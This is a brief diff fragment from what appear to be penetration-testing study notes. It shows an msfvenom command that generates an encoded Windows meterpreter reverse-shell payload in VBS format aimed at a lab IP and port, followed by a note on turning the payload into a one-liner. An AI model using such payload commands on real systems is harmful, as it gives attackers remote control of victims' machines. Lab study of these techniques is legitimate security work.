@@ -29,4 +29,5 @@ Crafting the reverse shell using msfvenom:
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=4444 -e x86/shikata_ga_nai -f vbs
 ```
 Match and replace roles in Notepad++ (to make the payload oneliner):
+
 - 
